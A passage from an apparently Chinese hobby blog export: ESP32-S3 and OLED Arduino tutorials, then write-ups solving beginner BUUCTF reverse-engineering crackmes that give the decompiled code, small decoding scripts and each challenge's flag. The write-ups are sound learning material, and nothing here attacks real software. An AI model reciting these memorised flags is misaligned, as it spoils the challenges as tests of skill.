OLED_SDA 9 // 构造对象 U8G2_SSD1306_128X64_NONAME_F_SW_I2C OLED(U8G2_R0, OLED_CLK, OLED_SDA, U8X8_PIN_NONE); // 选择你屏幕的规格，1315也可以用1306的驱动 void setup() { // 初始化OLED OLED.begin(); // 开启中文字符集支持 OLED.enableUTF8Print(); // 设置字体 OLED.setFont(u8g2_font_wqy12_t_gb2312); } void loop() { // 清除缓存区内容 OLED.clearBuffer(); // 绘制内容 OLED.setCursor(0, 10); OLED.print(\u0026#34;Hello, world!\u0026#34;); OLED.setCursor(0, 30); OLED.print(\u0026#34;你好,世界!\u0026#34;); // 发送缓存区内容到OLED OLED.sendBuffer(); delay(1000); } 带点私货，点亮：\nCiallo～(∠・ω\u0026lt; )⌒☆\n图片 使用image2cpp或pctolcd2002将图像转换为位图数组。\n示例代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 #include \u0026lt;Arduino.h\u0026gt; #include \u0026lt;U8g2lib.h\u0026gt; // 硬件I2C配置 #define OLED_SDA 20 #define OLED_SCL 21 U8G2_SSD1306_128X64_NONAME_F_HW_I2C OLED(U8G2_R0, U8X8_PIN_NONE, OLED_SCL, OLED_SDA); // 128x64 XBM格式图像数据（示例数据，需替换为你的实际数据） static const unsigned char imageData[] U8X8_PROGMEM = { // 这里替换为你的实际128x64图像数据（1024字节） 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0xFF,0xFF,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xF0,0xFF,0xFF,0x03,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0xF8,0x03,0xF8,0xFF,0xFF,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFE,0x1F,0xFC,0xFF,0xFF,0x0F,0xE0,0x07,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0xFE,0x3F,0xFE,0xFF,0xFF,0x1F,0xFE,0x1F,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFC,0x7F,0xFF,0xFF,0xFF,0x3F,0xFF,0x1F,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0xF8,0xFF,0xFF,0x00,0xC0,0xFF,0xFF,0x1F,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xF8,0xFF,0x0F,0x00,0x00,0xFC,0xFF,0x0F,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x07,0xF0,0xFF,0x01,0x40,0x01,0xF0,0xFF,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x09,0xE0,0x7F,0x00,0x38,0x02,0xC0,0xFF,0x03,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x09,0xC0,0x1F,0x00,0x04,0x44,0x00,0xFF,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x07,0x60,0x00,0x34,0x03,0xFC,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x10,0x00,0x01,0x08,0x03,0x08,0x04,0x38,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x12,0x80,0x00,0x02,0x00,0x08,0x10,0x10,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x02,0x40,0x80,0x01,0x01,0x00,0x20,0x60,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x20,0x40,0x00,0x01,0x10,0x40,0xC0,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x10,0x20,0x00,0x00,0x10,0x80,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x24,0x3C,0x10,0x00,0x00,0x10,0x00,0x01,0x01,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x24,0x53,0x08,0x00,0x00,0x10,0x00,0x02,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xA4,0x88,0x04,0x00,0x00,0x10,0x00,0x00,0x01,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0xFB,0x00,0x13,0x08,0x00,0x30,0x04,0xC4,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x60,0x04,0x02,0x80,0x01,0x30,0x08,0x20,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x80,0x00,0x09,0x84,0x01,0x50,0x08,0x18,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x88,0x82,0x04,0x94,0x11,0x90,0x09,0x08,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x40,0x50,0x80,0x02,0xC4,0x11,0xD0,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x64,0x41,0x03,0x48,0x13,0x10,0x09,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x20,0x28,0x41,0x03,0x4C,0x36,0x0C,0x09,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x10,0x81,0x01,0x54,0x24,0x08,0x0A,0x10,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x20,0x90,0x20,0x01,0x62,0x58,0x00,0x16,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x8C,0x40,0x01,0x62,0x10,0xF4,0x17,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x44,0x40,0x01,0xFD,0x05,0xF2,0x0C,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x20,0x00,0x01,0xE1,0x01,0xF1,0x20,0x04,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0xA0,0x10,0x00,0x01,0xE1,0xC1,0xF0,0x20,0x34,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x10,0x00,0x04,0xE1,0x41,0xF0,0x20,0x34,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x10,0x10,0x00,0x8E,0xE1,0x01,0xF0,0x60,0x4E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x8A,0xC1,0x01,0xE0,0x60,0x42,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x08,0x08,0x00,0x88,0xC0,0x00,0x60,0x00,0x89,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x08,0x00,0x95,0x02,0x00,0x00,0x10,0x88,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x04,0x08,0x00,0x95,0x02,0x00,0x00,0x50,0x08,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0xB8,0x80,0xA4,0x02,0x00,0x00,0x00,0x08,0x01,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x1C,0x81,0xC4,0x00,0xD0,0x03,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x3C,0x07,0x84,0x04,0x10,0x02,0x88,0x04,0x02,0x00,0x00,0x00, 0x00,0x00,0x00,0x01,0x3C,0x5A,0x20,0x00,0x10,0x02,0x80,0x02,0x04,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x7C,0x62,0x68,0x18,0x20,0x00,0xC6,0x01,0x04,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x7C,0x84,0xF7,0x30,0xC0,0x00,0x31,0x80,0x08,0x00,0x00,0x00,0x00,0x00,0x80,0x00,0x7E,0x00,0xD8,0x93,0x01,0xC0,0x0C,0x80,0x08,0x00,0x00,0x00, 0x00,0x00,0x80,0x01,0x7E,0x08,0xB8,0xFF,0x0E,0xF8,0x1F,0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x01,0x7F,0x08,0xB8,0xFF,0xC7,0x41,0x70,0x80,0x11,0x00,0x00,0x00, 0x00,0x00,0xC0,0x81,0x7F,0x00,0x78,0xFF,0xFF,0xFF,0xFF,0x80,0x11,0x00,0x00,0x00,0x00,0x00,0xC0,0x83,0x7F,0x10,0xF8,0xFF,0xFF,0xFF,0x7F,0x80,0x11,0x00,0x00,0x00, 0x00,0x00,0xC0,0x8C,0x7F,0x10,0xFC,0xFE,0xFF,0xFF,0x7F,0x48,0x11,0x00,0x00,0x00,0x00,0x00,0xC0,0xF0,0x7F,0x10,0xFC,0xFC,0xFF,0xFF,0x7F,0x7E,0x00,0x00,0x00,0x00, 0x00,0x00,0xC0,0xC0,0x7F,0x10,0xFC,0xEC,0xFF,0xFF,0xBF,0xF9,0x08,0x00,0x00,0x00,0x00,0x00,0xC0,0xC0,0x3F,0x10,0xFC,0xBC,0xFF,0xFF,0x1F,0xFE,0x00,0x00,0x00,0x00, 0x00,0x00,0xC0,0xC0,0x3F,0x10,0xFC,0x7C,0xFE,0xFF,0x03,0xFC,0x07,0x00,0x00,0x00,0x00,0x00,0xC0,0xC0,0x3F,0x30,0xFC,0x7C,0xC0,0x3F,0x0E,0xFC,0x07,0x00,0x00,0x00, 0x00,0x00,0xC0,0xC0,0x3F,0x30,0x7C,0x7C,0x00,0x80,0x0F,0xFC,0x01,0x00,0x00,0x00,0x00,0x00,0x80,0xC1,0x3F,0x10,0x7C,0x7C,0x18,0x80,0x0F,0xFC,0x09,0x00,0x00,0x00, 0x00,0x00,0x80,0xE1,0x1F,0x10,0x7C,0x7C,0x04,0x84,0x0F,0xFC,0x20,0x00,0x00,0x00,0x00,0x00,0x80,0xE1,0x1F,0x00,0x7C,0x7C,0x20,0xC1,0x07,0xFE,0x40,0x00,0x00,0x00, 0x00,0x00,0x80,0xE1,0x1F,0x00,0x7C,0x7C,0x22,0xC0,0x07,0x7E,0x80,0x01,0x00,0x00,0x00,0x00,0x80,0xE1,0x1F,0x00,0xFC,0x7E,0x22,0xC0,0x07,0x7F,0x00,0x02,0x00,0x00, 0x00,0x00,0x80,0xE1,0x0F,0x00,0x7C,0x7F,0x02,0xE1,0xC3,0x3F,0x00,0x04,0x00,0x00,0x00,0x00,0x80,0xE1,0x0F,0x80,0xFC,0x7F,0x14,0xE2,0xE3,0x3F,0x00,0x08,0x00,0x00 }; void setup() { // OLED初始化 OLED.begin(); OLED.clearBuffer(); // 显示全屏图像 OLED.drawXBM(0, 0, 128, 64, imageData); OLED.sendBuffer(); // 保持显示（可添加其他操作） delay(3000); } void loop() { // 留空或添加动态效果 } 成果：\n","date":"2025-02-13T00:00:00Z","image":"https://blog.wuko.top/posts/2025/02/13/esp32s3-platformio-i2c-u8g2.html/wheelchairGOD_hu_1e3f1b966c07375b.png","permalink":"https://blog.wuko.top/posts/2025/02/13/esp32s3-platformio-i2c-u8g2.html/","title":"【第一块开发板】记录esp32在platformIO通过U8g2库点亮i2c协议OLED屏幕的全过程"},{"content":" 电耗室。\n前言 本文偏向于小白记录生活，大佬轻喷\n为了得到大创课那点学分，决定做个软硬件结合的物联网项目。软件方面比较好说，但是硬件方面本人是从来没有接触过的，先前最多就是刷刷固件，修修小家电之类的。故决定踏入这个未知的领域，技多不压身嘛~\n购入 PDD花了44.3购入了一块ESP32-S3 N16R8开发板和一个OV2640摄像头（因为大创项目大概要涉及到WiFi通讯和视频传输，所以先买来练练手），苦等一个星期终于到货，迫不及待就开始操作。\n参数 类别 参数 主控芯片 ESP32-S3 (双核 LX7 32 位处理器，主频 240 MHz) 开发板品牌 freenova 存储配置 - Flash: 16 MB\n- PSRAM: 8 MB 开发环境 VSCode/PlatformIO 准备工作 VSCode里安装PlatformIO拓展，配置信息：\n1 2 3 platform = espressif32 board = esp32-s3-devkitc-1 framework = arduino 等待漫长的环境配置\u0026hellip;\n因为esp32-s3-devkitc-1默认存储信息和这个开发板不符，所以修改platformio.ini，加入以下内容:\n1 2 3 4 5 6 7 8 ; 指定为16MB的FLASH分区表 board_build.arduino.partitions = default_16MB.csv ; 指定FLASH和PSRAM的运行模式 board_build.arduino.memory_type = qio_opi ; 预定义宏，启用PSRAM build_flags = -DBOARD_HAS_PSRAM ; 指定FLASH容量为16MB board_upload.flash_size = 16MB 来自：CSDN\n驱动 CH343:http://www.wch-ic.com/search?t=all\u0026amp;q=ch343\n完成预安装后连接板子就完成了驱动的安装。\n点灯\u0026amp;串口通讯输出与监听 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #include \u0026lt;Arduino.h\u0026gt; #define LED_BUILTIN 2 // 定义LED GPIO引脚为2 // put function declarations here: int myFunction(int, int); void setup() { // put your setup code here, to run once: int result = myFunction(2, 3); pinMode(LED_BUILTIN, OUTPUT); // 设置LED为输出模式 Serial.begin(115200); // 初始化串口通信为115200 delay(1000); Serial.printf(\u0026#34;Chip Model: %s\\n\u0026#34;, ESP.getChipModel()); Serial.printf(\u0026#34;Flash Size: %d MB\\n\u0026#34;, ESP.getFlashChipSize() / (1024 * 1024)); Serial.printf(\u0026#34;PSRAM Size: %d MB\\n\u0026#34;, ESP.getPsramSize() / (1024 * 1024)); // 输出芯片信息 } void loop() { // put your main code here, to run repeatedly: digitalWrite(LED_BUILTIN, HIGH); delay(1000); digitalWrite(LED_BUILTIN, LOW); delay(1000); // 高电平亮，低电平熄，间隔一秒 } // put function definitions here: int myFunction(int x, int y) { return x + y; } 串口通讯需在platformio.ini中添加：\n1 monitor_speed = 115200 左下角upload（→）后，再点击serial monitor（插头），即可看到输出：\n1 2 3 4 5 6 7 8 9 10 11 12 ESP-ROM:esp32s3-20210327 Build:Mar 27 2021 rst:0x1 (POWERON),boot:0x8 (SPI_FAST_FLASH_BOOT) SPIWP:0xee mode:DIO, clock div:1 load:0x3fce3808,len:0x4bc load:0x403c9700,len:0xbd8 load:0x403cc700,len:0x2a0c entry 0x403c98d0 Chip Model: ESP32-S3 Flash Size: 16 MB PSRAM Size: 7 MB 一些困惑 开发板手册直接写了LED—IO2的GPIO是2，但是看开发板定义图里GPIO2定义的是ON那个LED，上传代码后亮的却是IO2的LED（这个LED在定义图里没有定义），不太明白。。\n还有PSRAM理论上来说应该是8MB，不知道为啥输出是7MB。。\n点亮外部引脚LED 其实是一个原理，设置某个引脚是高电平，然后和LED串联起来，最后接到GND就行。\n1 2 3 4 5 6 7 8 9 10 11 12 13 ... // 定义外接LED针脚为GPIO12 #define LED_OUTBRD 12 void setup() { // 设置GPIO12为输出模式 pinMode(LED_OUTBRD, OUTPUT); // 设置高电平点亮LED digitalWrite(LED_OUTBRD, HIGH); ... } ... 接了1k的电阻防止烧坏LED。\n还写了个简单的程序接入了deepseek的api，等后面再说吧，懒= =。\n","date":"2025-02-10T00:00:00Z","image":"https://blog.wuko.top/posts/2025/02/10/esp32s3wroom1.html/turnonzlight_hu_2f4eb7533ea4a79c.jpg","permalink":"https://blog.wuko.top/posts/2025/02/10/esp32s3wroom1.html/","title":"【第一块开发板】记录esp32s3wroom在platformIO的配置与点亮LED"},{"content":" [平台]题目\n[BUU]easyre IDA pro查看伪代码快捷键F5\n1 2 3 4 5 6 7 8 9 10 11 12 13 int __fastcall main(int argc, const char **argv, const char **envp) { int b; // [rsp+28h] [rbp-8h] BYREF int a; // [rsp+2Ch] [rbp-4h] BYREF _main(); scanf(\u0026#34;%d%d\u0026#34;, \u0026amp;a, \u0026amp;b); if ( a == b ) printf(\u0026#34;flag{this_Is_a_EaSyRe}\u0026#34;); else printf(\u0026#34;sorry,you can\u0026#39;t get flag\u0026#34;); return 0; } EZ，flag{this_Is_a_EaSyRe}\n[BUU]reverse1 IDA Pro查看字符串类型快捷键：Shift + F12\n直接找到了.data:000000014001C000\t0000000E\tC\t{hello_world}\n但提交并不对，继续查找，找到：\n1 .rdata:0000000140019C90\t00000019\tC\tthis is the right flag!\\n 双击进入，查看是哪段函数调用了该字符串Ctrl + X:\n1 2 3 4 5 6 7 8 sub_1400111D1(\u0026#34;input the flag:\u0026#34;); sub_14001128F(\u0026#34;%20s\u0026#34;, Str1); v5 = j_strlen(Str2); if ( !strncmp(Str1, Str2, v5) ) sub_1400111D1(\u0026#34;this is the right flag!\\n\u0026#34;); else sub_1400111D1(\u0026#34;wrong flag\\n\u0026#34;); return 0; strcmp判断str1与str2是否相等，str1是输入的字符串，所以str2应该就是flag的值，点击str2高亮它，发现它上面经过了一个处理：\n1 2 3 4 5 6 7 8 for ( j = 0; ; ++j ) { v10 = j; if ( j \u0026gt; j_strlen(Str2) ) break; if ( Str2[j] == 111 ) Str2[j] = 48; } 可以看到，经过一个遍历，str2中的111被改变为48，这是ascii码，选中数字后按下R转化为字符：\n1 2 if ( Str2[j] == \u0026#39;o\u0026#39; ) Str2[j] = \u0026#39;0\u0026#39;; 双击str2，可以看到str2是{hello_world}，那么flag即为：{hell0_w0rld}\n[BUU]reverse2 一样的步骤，F5分析main:\n1 2 3 4 5 for ( i = 0; i \u0026lt;= strlen(\u0026amp;flag); ++i ) { if ( *(\u0026amp;flag + i) == 105 || *(\u0026amp;flag + i) == 114 ) *(\u0026amp;flag + i) = 49; } R转换为字符：\n1 2 3 4 5 for ( i = 0; i \u0026lt;= strlen(\u0026amp;flag); ++i ) { if ( *(\u0026amp;flag + i) == \u0026#39;i\u0026#39; || *(\u0026amp;flag + i) == \u0026#39;r\u0026#39; ) *(\u0026amp;flag + i) = \u0026#39;1\u0026#39;; } 遍历，如果字符是i或者r，转换为1。\n双击flag:\n1 2 3 .data:0000000000601080 flag db 7Bh ; DATA XREF: main+34↑r .data:0000000000601080 ; main+44↑r ... .data:0000000000601081 aHackingForFun db \u0026#39;hacking_for_fun}\u0026#39;,0 其中7BhR一下就是{\n所以flag处理前是{hacking_for_fun}，处理后就是：{hack1ng_fo1_fun}\n[BUU]内涵的软件 shift + F12秒了\u0026hellip;\nDBAPP{49d3c93df25caad81232130f3d2ebfad}\n但还是分析下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 int __cdecl main_0(int argc, const char **argv, const char **envp) { char v4[4]; // [esp+4Ch] [ebp-Ch] BYREF const char *v5; // [esp+50h] [ebp-8h] int v6; // [esp+54h] [ebp-4h] v6 = 5; v5 = \u0026#34;DBAPP{49d3c93df25caad81232130f3d2ebfad}\u0026#34;; while ( v6 \u0026gt;= 0 ) { printf(aD, v6); sub_40100A(); --v6; } printf( \u0026#34;\\n\u0026#34; \u0026#34;\\n\u0026#34; \u0026#34;\\n\u0026#34; \u0026#34;这里本来应该是答案的,但是粗心的程序员忘记把变量写进来了,你要不逆向试试看:(Y/N)\\n\u0026#34;); v4[0] = 1; scanf(\u0026#34;%c\u0026#34;, v4); if ( v4[0] == 89 ) { printf(aOdIda); return sub_40100A(); } else { if ( v4[0] == 78 ) printf(asc_425034); else printf(\u0026#34;输入错误,没有提示.\u0026#34;); return sub_40100A(); } } 定义了字符串v5但是没有使用，所以是忘记把变量写进来了\n[BUU]新年快乐 DIE查壳：UPX(3.91)[NRV,best]\n脱壳，虽然打不开程序了，但是ida可以分析了：\n1 2 3 4 5 6 7 8 9 strcpy(Str2, \u0026#34;HappyNewYear!\u0026#34;); *(_WORD *)Str1 = word_40306B; memset(\u0026amp;Str1[2], 0, 0x1Eu); printf(\u0026#34;please input the true flag:\u0026#34;); scanf(\u0026#34;%s\u0026#34;, Str1); if ( !strncmp(Str1, Str2, strlen(Str2)) ) return puts(aThisIsTrueFlag); else return puts(Buffer); 得到了HappyNewYear!\n[BUU]xor 1 2 3 4 5 6 7 8 9 10 11 12 13 memset(__b, 0, 0x100uLL); printf(\u0026#34;Input your flag:\\n\u0026#34;); get_line(__b, 256LL); if ( strlen(__b) != 33 ) goto LABEL_7; for ( i = 1; i \u0026lt; 33; ++i ) __b[i] ^= __b[i - 1]; //异或操作 if ( !strncmp(__b, global, 0x21uLL) ) printf(\u0026#34;Success\u0026#34;); else LABEL_7: printf(\u0026#34;Failed\u0026#34;); return 0; 输入__b，异或后与global进行比较，所以global应该是flag异或后的值。\n提取global，shift + E导出数据：\npython写一遍异或的部分:\n1 2 3 4 5 6 7 8 lst = [102, 10, 107, 12, 119, 38, 79, 46, 64, 17, 120, 13, 90, 59, 85, 17, 112, 25, 70, 31, 118, 34, 77, 35, 68, 14, 103, 6, 104, 15, 71, 50, 79, 0] flag = chr(lst[0]) for i in range(1, len(lst)): flag += chr(lst[i] ^ lst[i - 1]) print(flag) # flag{QianQiuWanDai_YiTongJiangHu}O 得到：flag{QianQiuWanDai_YiTongJiangHu}\n[BUU]reverse3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 nt __cdecl main_0(int argc, const char **argv, const char **envp) { size_t v3; // eax const char *v4; // eax size_t v5; // eax char v7; // [esp+0h] [ebp-188h] char v8; // [esp+0h] [ebp-188h] signed int j; // [esp+DCh] [ebp-ACh] int i; // [esp+E8h] [ebp-A0h] signed int v11; // [esp+E8h] [ebp-A0h] char Destination[108]; // [esp+F4h] [ebp-94h] BYREF char Str[28]; // [esp+160h] [ebp-28h] BYREF char v14[8]; // [esp+17Ch] [ebp-Ch] BYREF for ( i = 0; i \u0026lt; 100; ++i ) { if ( (unsigned int)i \u0026gt;= 0x64 ) j____report_rangecheckfailure(); Destination[i] = 0; } sub_41132F(\u0026#34;please enter the flag:\u0026#34;, v7); sub_411375(\u0026#34;%20s\u0026#34;, (char)Str); v3 = j_strlen(Str); v4 = (const char *)sub_4110BE(Str, v3, v14); strncpy(Destination, v4, 0x28u); v11 = j_strlen(Destination); for ( j = 0; j \u0026lt; v11; ++j ) Destination[j] += j; v5 = j_strlen(Destination); if ( !strncmp(Destination, Str2, v5) ) sub_41132F(\u0026#34;rigth flag!\\n\u0026#34;, v8); else sub_41132F(\u0026#34;wrong flag!\\n\u0026#34;, v8); return 0; } 先查看Str2变量，得到值e3nifIH9b_C@n@dH，然后一步一步往上推。\n1 2 for ( j = 0; j \u0026lt; v11; ++j ) Destination[j] += j; Destination为输入的flag后经过处理的字符串，在这个循环中又经过了位移处理：\n每个字符向右偏移它位置的值。\n举个例子就好理解了：\n假设Destination为{'A', 'B'}，那么A = A + 0(A位于0)，B = B + 1 = C(B位于1，B+1为C，ASCII码)。\nAI写个逆向脚本：\n1 2 3 4 5 6 7 8 9 10 11 original_str = \u0026#34;e3nifIH9b_C@n@dH\u0026#34; result_str = \u0026#34;\u0026#34; index = 0 for char in original_str: # 获取ASCII码 → 减索引 → 转回字符 decoded_char = chr(ord(char) - index) result_str += decoded_char index += 1 print(result_str) #e2lfbDB2ZV95b3V9 e2lfbDB2ZV95b3V9\n然后继续溯源，sub_4110BE()返回sub_411AB0()函数处理后的内容，先查看它传入411了什么参数：\n1 2 char v14[8]; v4 = (const char *)sub_4110BE(Str, v3, (int *)v14); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 void *__cdecl sub_411AB0(char *a1, unsigned int a2, int *a3) { int v4; // [esp+D4h] [ebp-38h] int v5; // [esp+D4h] [ebp-38h] int v6; // [esp+D4h] [ebp-38h] int v7; // [esp+D4h] [ebp-38h] int i; // [esp+E0h] [ebp-2Ch] unsigned int v9; // [esp+ECh] [ebp-20h] int v10; // [esp+ECh] [ebp-20h] int v11; // [esp+ECh] [ebp-20h] void *v12; // [esp+F8h] [ebp-14h] char *v13; // [esp+104h] [ebp-8h] if ( !a1 || !a2 ) return 0; v9 = a2 / 3; if ( (int)(a2 / 3) % 3 ) ++v9; v10 = 4 * v9; *a3 = v10; v12 = malloc(v10 + 1); if ( !v12 ) return 0; j_memset(v12, 0, v10 + 1); v13 = a1; v11 = a2; v4 = 0; while ( v11 \u0026gt; 0 ) { byte_41A144[2] = 0; byte_41A144[1] = 0; byte_41A144[0] = 0; for ( i = 0; i \u0026lt; 3 \u0026amp;\u0026amp; v11 \u0026gt;= 1; ++i ) { byte_41A144[i] = *v13; --v11; ++v13; } if ( !i ) break; switch ( i ) { case 1: *((_BYTE *)v12 + v4) = aAbcdefghijklmn[(int)(unsigned __int8)byte_41A144[0] \u0026gt;\u0026gt; 2]; v5 = v4 + 1; *((_BYTE *)v12 + v5) = aAbcdefghijklmn[((byte_41A144[1] \u0026amp; 0xF0) \u0026gt;\u0026gt; 4) | (16 * (byte_41A144[0] \u0026amp; 3))]; *((_BYTE *)v12 + ++v5) = aAbcdefghijklmn[64]; *((_BYTE *)v12 + ++v5) = aAbcdefghijklmn[64]; v4 = v5 + 1; break; case 2: *((_BYTE *)v12 + v4) = aAbcdefghijklmn[(int)(unsigned __int8)byte_41A144[0] \u0026gt;\u0026gt; 2]; v6 = v4 + 1; *((_BYTE *)v12 + v6) = aAbcdefghijklmn[((byte_41A144[1] \u0026amp; 0xF0) \u0026gt;\u0026gt; 4) | (16 * (byte_41A144[0] \u0026amp; 3))]; *((_BYTE *)v12 + ++v6) = aAbcdefghijklmn[((byte_41A144[2] \u0026amp; 0xC0) \u0026gt;\u0026gt; 6) | (4 * (byte_41A144[1] \u0026amp; 0xF))]; *((_BYTE *)v12 + ++v6) = aAbcdefghijklmn[64]; v4 = v6 + 1; break; case 3: *((_BYTE *)v12 + v4) = aAbcdefghijklmn[(int)(unsigned __int8)byte_41A144[0] \u0026gt;\u0026gt; 2]; v7 = v4 + 1; *((_BYTE *)v12 + v7) = aAbcdefghijklmn[((byte_41A144[1] \u0026amp; 0xF0) \u0026gt;\u0026gt; 4) | (16 * (byte_41A144[0] \u0026amp; 3))]; *((_BYTE *)v12 + ++v7) = aAbcdefghijklmn[((byte_41A144[2] \u0026amp; 0xC0) \u0026gt;\u0026gt; 6) | (4 * (byte_41A144[1] \u0026amp; 0xF))]; *((_BYTE *)v12 + ++v7) = aAbcdefghijklmn[byte_41A144[2] \u0026amp; 0x3F]; v4 = v7 + 1; break; } } *((_BYTE *)v12 + v4) = 0; return v12; } AI分析，这是一个Base64编码函数:\n1 char* base64_encode(const void* input, size_t len, int* out_len); 解码得到：{i_l0ve_you}\n[BUU]helloword 下载，发现是安卓逆向，同样可以用IDA Pro解决：\n新建项目，拖入主类classes.dex，加载过后，查看所有字符串Shift+F12，再接一个Ctrl+F查找，输入flag，找到：\nflag{7631a988259a00816deda84afb29430a}\n[BUU]不一样的flag 找到主函数：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { _BYTE v3[29]; // [esp+17h] [ebp-35h] BYREF int v4; // [esp+34h] [ebp-18h] int v5; // [esp+38h] [ebp-14h] BYREF int i; // [esp+3Ch] [ebp-10h] _BYTE v7[12]; // [esp+40h] [ebp-Ch] BYREF __main(); v3[26] = 0; *\u0026amp;v3[27] = 0; v4 = 0; strcpy(v3, \u0026#34;*11110100001010000101111#\u0026#34;); while ( 1 ) { puts(\u0026#34;you can choose one action to execute\u0026#34;); puts(\u0026#34;1 up\u0026#34;); puts(\u0026#34;2 down\u0026#34;); puts(\u0026#34;3 left\u0026#34;); printf(\u0026#34;4 right\\n:\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;v5); if ( v5 == 2 ) { ++*\u0026amp;v3[25]; } else if ( v5 \u0026gt; 2 ) { if ( v5 == 3 ) { --v4; } else { if ( v5 != 4 ) LABEL_13: exit(1); ++v4; } } else { if ( v5 != 1 ) goto LABEL_13; --*\u0026amp;v3[25]; } for ( i = 0; i \u0026lt;= 1; ++i ) { if ( *\u0026amp;v3[4 * i + 25] \u0026gt;= 5u ) exit(1); } if ( v7[5 * *\u0026amp;v3[25] - 41 + v4] == 49 ) exit(1); if ( v7[5 * *\u0026amp;v3[25] - 41 + v4] == 35 ) { puts(\u0026#34;\\nok, the order you enter is the flag!\u0026#34;); exit(0); } } } 首先，它开头定义了一个字符数组v3，存放*11110100001010000101111#。\n对代码分析可得，在经过多次输入操作后，满足v7[5 * *\u0026amp;v3[25] - 41 + v4] == 35后，也就是v7[5 * *\u0026amp;v3[25] - 41 + v4] == '#'，输出ok, the order you enter is the flag!，flag即是输入的命令。\nAI分析，原来是个迷宫游戏：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 int __cdecl __noreturn main() { char game_map[27] = \u0026#34;*11110100001010000101111#\u0026#34;; // 5x5迷宫地图 int current_col = 0; // 当前列坐标 int current_row = 0; // 当前行坐标 (存储在game_map[25]的位置) int user_input; // 用户输入的方向 while(1) { // 打印操作选项 puts(\u0026#34;1 up\\n2 down\\n3 left\\n4 right\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;user_input); // 根据输入调整坐标 switch(user_input) { case 1: current_row--; break; // 上移 case 2: current_row++; break; // 下移 case 3: current_col--; break; // 左移 case 4: current_col++; break; // 右移 default: exit(1); // 非法输入 } // 边界检查（地图范围0-4） if(current_row \u0026lt; 0 || current_row \u0026gt;4 || current_col \u0026lt;0 || current_col \u0026gt;4) { exit(1); // 越界 } // 获取当前位置的字符 char current_cell = game_map[1 + 5*current_row + current_col]; // +1跳过首字符* if(current_cell == \u0026#39;1\u0026#39;) { // 撞到障碍物 exit(1); } else if(current_cell == \u0026#39;#\u0026#39;) { // 到达终点 puts(\u0026#34;Flag是你的操作序列!\u0026#34;); exit(0); } } } 